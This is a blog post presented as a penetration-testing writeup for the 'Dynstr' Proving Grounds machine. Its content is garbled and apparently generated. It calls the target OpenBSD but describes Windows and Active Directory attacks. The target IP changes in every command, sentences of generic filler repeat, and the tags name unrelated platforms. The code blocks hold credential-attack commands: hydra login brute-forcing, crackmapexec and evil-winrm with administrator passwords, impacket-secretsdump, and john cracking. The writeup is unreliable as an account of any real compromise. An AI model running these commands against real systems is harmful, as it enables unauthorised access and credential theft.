---
TitleSEO: "OffSec Proving Grounds — Dynstr (Insane OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Dynstr (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Dynstr. Constrained Delegation and SUID Binary to achieve insane compromise on OpenBSD."
Keywords: "ctf, web, hackthebox, windows, hard, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-dynstr-747.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-dynstr-747/"
Date: "2024-03-30"
Tags: "CTF, Web, HackTheBox, Windows, Hard, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-dynstr-747"
Permalink: "/writeups/htb-dynstr-747.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Dynstr** is rated **Insane** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.92.49.167`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p993,464,80 10.114.108.196 -oN scan.txt
feroxbuster -h
feroxbuster -h
crackmapexec smb 10.54.114.79 -u administrator -p 'P@ssw0rd!' --shares
```

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.66.114.177 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.100.9.103 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.20.245.28 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

### Web Enumeration

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.144.159 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.82.74.248 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.32.243 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **SUID Binary**.

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.32.21.243 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.21.183.69
```

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.74.173.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p587,21,23 10.85.182.183 -oN scan.txt
evil-winrm -i 10.93.78.35 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.20.233.231/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `msfvenom`
- `evil-winrm`
- `hashcat`
- `hydra`
- `mimikatz`

### Key Takeaways

- Constrained Delegation
- SUID Binary
- Remote Code Execution
- XXE
